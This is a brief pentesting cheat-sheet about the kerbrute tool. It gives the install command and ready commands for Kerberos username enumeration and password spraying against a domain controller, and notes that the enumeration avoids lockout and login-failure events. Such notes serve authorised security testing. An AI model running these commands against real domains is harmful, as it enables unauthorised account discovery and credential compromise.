# kerbrute

<div class="row row-cols-lg-2"><div>

[kerbrute](https://github.com/ropnop/kerbrute) <small>(2.4k ⭐, 2020 🪦)</small> is a popular tool that can be used for username enumeration and for password spraying on Kerberos.

You can install it using:

```ps
$ go install github.com/ropnop/kerbrute@latest
```
</div><div>

**Username enumeration** 🧑: it use Kerberos Pre-Authentication to perform its enumeration. It generates event code 4768 <small>(TGT request)</small> instead of 4625 <small>(login failure)</small>. It doesn't count towards account lockout.

```ps
$ kerbrute userenum -d domain --dc IP wordlist
$ kerbrute userenum -d domain --dc IP wordlist > output.txt ; grep + output.txt | cut -d ' ' -f8 | cut -d '@' -f1 > valid_users.txt
```

📚 If a user has no pre auth, their hash is dumped.

**Password Spraying** 🔏

```ps
$ kerbrute passwordspray -d domain --dc IP valid_users.txt mypassword
<may not work, use nxc/cme instead>
```
</div></div>